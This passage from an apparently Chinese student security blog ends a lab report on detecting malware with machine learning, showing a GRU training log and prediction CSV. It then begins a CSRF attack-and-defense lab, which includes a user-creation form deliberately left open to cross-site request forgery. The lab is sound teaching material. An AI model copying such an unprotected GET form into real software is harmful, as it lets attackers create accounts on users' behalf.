class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">PS D:\chen_hao\病毒检测机器学习&gt; &amp; D:/ProgramSoftware/anaconda3/python.exe d:/chen_hao/病毒检测机器学习/RNN.py</span><br><span class="line">Using device: cuda</span><br><span class="line"></span><br><span class="line">Epoch 1/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:32&lt;00:00,  1.35it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.01it/s] </span><br><span class="line">Train Loss: 1.6978, Train Accuracy: 0.4272</span><br><span class="line">Validation Loss: 1.5224, Validation Accuracy: 0.4460</span><br><span class="line">Model saved!</span><br><span class="line"></span><br><span class="line">Epoch 2/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:27&lt;00:00,  1.59it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.01it/s] </span><br><span class="line">Train Loss: 1.5041, Train Accuracy: 0.4547</span><br><span class="line">Validation Loss: 1.5046, Validation Accuracy: 0.4471</span><br><span class="line">Model saved!</span><br><span class="line"></span><br><span class="line">Epoch 3/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:29&lt;00:00,  1.51it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s] </span><br><span class="line">Train Loss: 1.4797, Train Accuracy: 0.4620</span><br><span class="line">Validation Loss: 1.4927, Validation Accuracy: 0.4489</span><br><span class="line">Model saved!</span><br><span class="line"></span><br><span class="line">Epoch 4/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.56it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s] </span><br><span class="line">Train Loss: 1.4648, Train Accuracy: 0.4689</span><br><span class="line">Validation Loss: 1.4740, Validation Accuracy: 0.4633</span><br><span class="line">Model saved!</span><br><span class="line"></span><br><span class="line">Epoch 5/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:27&lt;00:00,  1.58it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s] </span><br><span class="line">Train Loss: 1.4373, Train Accuracy: 0.4820</span><br><span class="line">Validation Loss: 1.4314, Validation Accuracy: 0.4924</span><br><span class="line">Model saved!</span><br><span class="line"></span><br><span class="line">Epoch 6/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:27&lt;00:00,  1.59it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.01it/s] </span><br><span class="line">Train Loss: 1.4187, Train Accuracy: 0.4918</span><br><span class="line">Validation Loss: 1.3496, Validation Accuracy: 0.5169</span><br><span class="line">Model saved!</span><br><span class="line"></span><br><span class="line">Epoch 7/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.57it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s] </span><br><span class="line">Train Loss: 1.4115, Train Accuracy: 0.5090</span><br><span class="line">Validation Loss: 1.3058, Validation Accuracy: 0.5504</span><br><span class="line">Model saved!</span><br><span class="line"></span><br><span class="line">Epoch 8/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.57it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.00it/s] </span><br><span class="line">Train Loss: 1.1772, Train Accuracy: 0.6115</span><br><span class="line">Validation Loss: 1.0737, Validation Accuracy: 0.6267</span><br><span class="line">Model saved!</span><br><span class="line"></span><br><span class="line">Epoch 9/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.55it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s] </span><br><span class="line">Train Loss: 1.0006, Train Accuracy: 0.6609</span><br><span class="line">Validation Loss: 0.9820, Validation Accuracy: 0.6598</span><br><span class="line">Model saved!</span><br><span class="line"></span><br><span class="line">Epoch 10/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.55it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s] </span><br><span class="line">Train Loss: 0.9129, Train Accuracy: 0.6887</span><br><span class="line">Validation Loss: 0.9084, Validation Accuracy: 0.6749</span><br><span class="line">Model saved!</span><br><span class="line"></span><br><span class="line">Epoch 11/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.55it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s] </span><br><span class="line">Train Loss: 0.8453, Train Accuracy: 0.7069</span><br><span class="line">Validation Loss: 0.8542, Validation Accuracy: 0.7030</span><br><span class="line">Model saved!</span><br><span class="line"></span><br><span class="line">Epoch 12/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.55it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s] </span><br><span class="line">Train Loss: 0.7822, Train Accuracy: 0.7422</span><br><span class="line">Validation Loss: 0.7674, Validation Accuracy: 0.7520</span><br><span class="line">Model saved!</span><br><span class="line"></span><br><span class="line">Epoch 13/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.55it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s] </span><br><span class="line">Train Loss: 0.7204, Train Accuracy: 0.7704</span><br><span class="line">Validation Loss: 0.7360, Validation Accuracy: 0.7639</span><br><span class="line">Model saved!</span><br><span class="line"></span><br><span class="line">Epoch 14/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.55it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s] </span><br><span class="line">Train Loss: 0.7144, Train Accuracy: 0.7717</span><br><span class="line">Validation Loss: 0.7184, Validation Accuracy: 0.7664</span><br><span class="line">Model saved!</span><br><span class="line"></span><br><span class="line">Epoch 15/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.55it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.02it/s] </span><br><span class="line">Train Loss: 0.6625, Train Accuracy: 0.7878</span><br><span class="line">Validation Loss: 0.6925, Validation Accuracy: 0.7721</span><br><span class="line">Model saved!</span><br><span class="line"></span><br><span class="line">Epoch 16/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.54it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s] </span><br><span class="line">Train Loss: 0.6390, Train Accuracy: 0.7931</span><br><span class="line">Validation Loss: 0.6748, Validation Accuracy: 0.7815</span><br><span class="line">Model saved!</span><br><span class="line"></span><br><span class="line">Epoch 17/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.55it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s] </span><br><span class="line">Train Loss: 0.6061, Train Accuracy: 0.8033</span><br><span class="line">Validation Loss: 0.6415, Validation Accuracy: 0.7927</span><br><span class="line">Model saved!</span><br><span class="line"></span><br><span class="line">Epoch 18/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.55it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.00it/s] </span><br><span class="line">Train Loss: 0.5665, Train Accuracy: 0.8278</span><br><span class="line">Validation Loss: 0.5947, Validation Accuracy: 0.8279</span><br><span class="line">Model saved!</span><br><span class="line"></span><br><span class="line">Epoch 19/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.53it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.02it/s] </span><br><span class="line">Train Loss: 0.5263, Train Accuracy: 0.8396</span><br><span class="line">Validation Loss: 0.5656, Validation Accuracy: 0.8287</span><br><span class="line">Model saved!</span><br><span class="line"></span><br><span class="line">Epoch 20/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.52it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s] </span><br><span class="line">Train Loss: 0.5044, Train Accuracy: 0.8467</span><br><span class="line">Validation Loss: 0.5578, Validation Accuracy: 0.8366</span><br><span class="line">Model saved!</span><br><span class="line">d:\chen_hao\病毒检测机器学习\RNN.py:146: FutureWarning: You are using `torch.load` with `weights_only=False` (the current default value), which uses the default pickle module implicitly. It is possible to construct malicious pickle data which will execute arbitrary code during unpickling (See https://github.com/pytorch/pytorch/blob/main/SECURITY.md#untrusted-models for more details). In a future release, the default value for `weights_only` will be flipped to `True`. This limits the functions that could be executed during unpickling. Arbitrary objects will no longer be allowed to be loaded via this mode unless they are explicitly allowlisted by the user via `torch.serialization.add_safe_globals`. We recommend you start setting `weights_only=True` for any use case where you don&#x27;t have full control of the loaded file. Please open an issue on GitHub for any issues related to this experimental feature.</span><br><span class="line">  model.load_state_dict(torch.load(&#x27;best_gru_model.pth&#x27;))</span><br><span class="line">Testing: 100%|███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 51/51 [00:25&lt;00:00,  2.01it/s] </span><br><span class="line">预测完成并保存至 pytorch_gru_submission.csv</span><br><span class="line">PS D:\chen_hao\病毒检测机器学习&gt;</span><br></pre></td></tr></table></figure>
   <img src="/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/image-20241212143434312.png" class="" title="image-20241212123845251">
   <img src="/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/image-20241212144205267.png" class="" title="image-20241212144205267">
   <img src="/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/image-20241213005217419.png" class="" title="image-20241213005217419">
   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">file_id,prob0,prob1,prob2,prob3,prob4,prob5,prob6,prob7</span><br><span class="line">1,0.06448878,0.002397979,0.9028775,0.0013381493,0.00045697886,0.0020659335,0.003058874,0.023315739</span><br><span class="line">2,0.9813138,8.656157e-05,0.0029583538,0.0011351788,0.00028997194,0.006586187,0.0018473516,0.005782577</span><br><span class="line">3,0.99163276,5.5359196e-05,0.0027402057,0.0004632939,0.000118531985,0.0013870831,0.00072588393,0.0028768326</span><br><span class="line">4,0.021272896,0.011765718,0.024904,0.076123476,0.015064285,0.025066515,0.17768894,0.6481142</span><br><span class="line">5,0.904939,0.00073774875,0.04147379,0.002916103,0.0005452043,0.0022994527,0.007011477,0.040077265</span><br><span class="line">6,0.0021798164,0.0007873667,0.0014384006,0.0027823928,0.00244751,0.9728891,0.011387657,0.006087801</span><br><span class="line">7,0.0068255765,0.017928587,0.0011721165,0.5918627,0.028887965,0.08608816,0.065764345,0.20147054</span><br><span class="line">8,0.256366,0.00392755,0.17083807,0.03653748,0.0030841657,0.014288423,0.043775067,0.4711833</span><br><span class="line">9,0.036793254,0.010180762,0.07269347,0.028041216,0.007907337,0.014224959,0.1945642,0.6355948</span><br><span class="line">10,0.25146127,0.0009808545,0.0032455756,0.375254,0.008948095,0.1938656,0.042228147,0.124016486</span><br><span class="line">11,0.00095530774,0.09089262,0.001956982,0.0021283366,0.0098222485,0.88708365,0.004995707,0.0021652123</span><br><span class="line">12,0.9000948,0.00055806845,0.07364376,0.0017178208,0.00039910257,0.0030469508,0.0031312718,0.017408215</span><br><span class="line">13,0.9858329,7.062489e-05,0.002319975,0.00074456446,0.00021577052,0.0051714894,0.0013318722,0.0043128696</span><br><span class="line">14,0.71485704,0.0018635483,0.1835684,0.0046869554,0.00093834405,0.0039504743,0.012158039,0.07797725</span><br><span class="line">15,0.95209205,0.00034266696,0.024804827,0.0013410876,0.00033840715,0.002777113,0.0031649894,0.015138777</span><br><span class="line">16,0.9988642,6.826462e-05,0.0005704778,5.0490657e-05,5.821846e-05,1.5237126e-05,5.5164932e-05,0.00031797035</span><br><span class="line">17,0.00090827956,0.0009387416,0.0012451294,0.00543124,0.003330927,0.96512026,0.014691722,0.008333769</span><br><span class="line">18,0.01809039,0.0010136849,0.0009486259,0.55183834,0.017171165,0.17679921,0.012343813,0.22179477</span><br><span class="line">19,0.9777029,0.00014269094,0.0092709325,0.0011368245,0.000268385,0.003403238,0.0015272632,0.006547669</span><br><span class="line">20,0.9926167,4.7670434e-05,0.002156556,0.00042129072,0.000109387,0.0013140069,0.0006860488,0.0026483978</span><br><span class="line">21,0.9420716,0.00025259246,0.010330827,0.0035953792,0.0003313114,0.013363041,0.002719807,0.027335435</span><br><span class="line">22,0.010564044,0.013456773,0.013810868,0.10937901,0.023766087,0.07066154,0.2242378,0.53412384</span><br><span class="line">23,0.0074043795,0.0237848,0.8829586,0.016059525,0.012664877,0.015524606,0.0027832955,0.03881999</span><br><span class="line">24,0.7460677,0.0016432973,0.16402717,0.0043358603,0.0008404788,0.003432122,0.010673889,0.06897949</span><br></pre></td></tr></table></figure>
<h4 id="总结与展望"><a href="#总结与展望" class="headerlink" title="总结与展望"></a>总结与展望</h4><ol>
<li><strong>实验结论</strong>：<ul>
<li><strong>勒索病毒</strong>：设计了一个简单的勒索病毒Demo，揭示其文件加密与解密原理。</li>
<li><strong>机器学习</strong>：使用LightGBM结合TF-IDF特征，模型性能优秀，适合快速检测。</li>
<li><strong>深度学习</strong>：GRU模型对复杂API序列分类效果更优，适合进一步研究。</li>
</ul>
</li>
<li><strong>优化方向</strong>：<ul>
<li>引入更复杂的注意力机制，加强深度学习模型对序列数据的理解。</li>
<li>数据增强，扩展训练数据多样性，提升模型泛化能力。</li>
<li>结合机器学习和深度学习结果进行模型融合，进一步提升检测与分类性能。</li>
</ul>
</li>
</ol>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://moyuan10086.github.io/2024/12/04/CSRF%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E6%8A%A4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="moyuan">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Moyuan"s website">
      <meta itemprop="description" content="prograing or coffee">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Moyuan"s website">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/12/04/CSRF%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E6%8A%A4/" class="post-title-link" itemprop="url">CSRF攻击与防护</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-12-04 00:48:14 / 修改时间：00:48:32" itemprop="dateCreated datePublished" datetime="2024-12-04T00:48:14+08:00">2024-12-04</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="CSRF攻击与防护"><a href="#CSRF攻击与防护" class="headerlink" title="CSRF攻击与防护"></a><strong>CSRF攻击与防护</strong></h3><h4 id="1-背景与原理"><a href="#1-背景与原理" class="headerlink" title="1. 背景与原理"></a><strong>1. 背景与原理</strong></h4><h5 id="1-1-CSRF攻击定义"><a href="#1-1-CSRF攻击定义" class="headerlink" title="1.1 CSRF攻击定义"></a><strong>1.1 CSRF攻击定义</strong></h5><ul>
<li>CSRF（Cross Site Request Forgery，跨站请求伪造）是一种利用用户身份权限的攻击方式。</li>
<li>攻击者诱导已登录目标网站的用户访问含有恶意代码的页面，伪造用户的合法请求，执行未授权操作。</li>
</ul>
<h5 id="1-2-CSRF攻击的原理"><a href="#1-2-CSRF攻击的原理" class="headerlink" title="1.2 CSRF攻击的原理"></a><strong>1.2 CSRF攻击的原理</strong></h5><ul>
<li>浏览器的同源策略允许同源的网页共享Cookie，但攻击者可以利用此策略：<ol>
<li>用户登录目标网站后，浏览器保存Cookie。</li>
<li>用户访问恶意页面时，页面中的恶意代码通过伪造请求，利用用户Cookie向目标网站发送恶意请求。</li>
</ol>
</li>
</ul>
<h5 id="1-3-CSRF攻击的危害"><a href="#1-3-CSRF攻击的危害" class="headerlink" title="1.3 CSRF攻击的危害"></a><strong>1.3 CSRF攻击的危害</strong></h5><ul>
<li>在用户毫不知情的情况下：<ul>
<li>窃取用户信息。</li>
<li>未经授权的资金转移。</li>
<li>操作敏感的账户功能。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="2-项目任务概述"><a href="#2-项目任务概述" class="headerlink" title="2. 项目任务概述"></a><strong>2. 项目任务概述</strong></h4><p>实验通过创建两个网站（目标网站和攻击网站），模拟CSRF攻击并探讨防护措施。具体任务如下：</p>
<ol>
<li>建立一个具有用户添加功能的目标网站（存在CSRF漏洞）。</li>
<li>创建一个模拟CSRF攻击的网站。</li>
<li>测试目标网站是否可以被CSRF攻击。</li>
<li>通过HTTP Referer验证和操作确认对话框两种方式防护CSRF攻击。</li>
</ol>
<hr>
<h4 id="3-实验过程"><a href="#3-实验过程" class="headerlink" title="3. 实验过程"></a><strong>3. 实验过程</strong></h4><h5 id="3-1-任务1：建立具有CSRF漏洞的目标网站"><a href="#3-1-任务1：建立具有CSRF漏洞的目标网站" class="headerlink" title="3.1 任务1：建立具有CSRF漏洞的目标网站"></a><strong>3.1 任务1：建立具有CSRF漏洞的目标网站</strong></h5><h6 id="3-1-1-环境准备"><a href="#3-1-1-环境准备" class="headerlink" title="3.1.1 环境准备"></a><strong>3.1.1 环境准备</strong></h6><ul>
<li>在Apache根目录下（<code>C:\Apache24\htdocs</code>）创建名为<code>csrf</code>的文件夹，作为目标网站目录。</li>
<li>复制基础网站代码文件至<code>csrf</code>目录，添加用户管理功能。</li>
</ul>
<h6 id="3-1-2-添加功能"><a href="#3-1-2-添加功能" class="headerlink" title="3.1.2 添加功能"></a><strong>3.1.2 添加功能</strong></h6><ol>
<li><p><strong>添加用户页面</strong>：</p>
<ul>
<li><p>创建<code>newuser.html</code>，内容为用户输入用户名和密码的表单。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>NewUser<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#a</span>&#123; <span class="attribute">width</span>: <span class="number">300px</span>; <span class="attribute">text-align</span>: right; &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.b</span>&#123;<span class="attribute">width</span>: <span class="number">150px</span>;<span class="attribute">height</span>:<span class="number">20px</span>;&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">	include_once &quot;functions.php&quot;;</span></span><br><span class="line"><span class="meta">	start_session($expires);</span></span><br><span class="line"><span class="meta">	</span></span><br><span class="line"><span class="meta">	if(!isset($_SESSION[&#x27;username&#x27;]))&#123;</span></span><br><span class="line"><span class="meta">		echo &#x27;您没有权限访问此页面&#x27;;</span></span><br><span class="line"><span class="meta">		exit;		</span></span><br><span class="line"><span class="meta">	&#125;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">	?&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">a</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">p</span> <span class="attr">align</span>=<span class="string">&quot;left&quot;</span>&gt;</span>添加用户:<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;form_register&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span> <span class="attr">action</span>=<span class="string">&quot;do_adduser.php&quot;</span>&gt;</span></span><br><span class="line">			Username: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">b</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">			Psssword: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span>  <span class="attr">class</span>=<span class="string">b</span> <span class="attr">name</span>=<span class="string">&quot;passwd&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span> </span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;reset&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Reset&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Reset&quot;</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p><strong>处理后台请求</strong>：</p>
<ul>
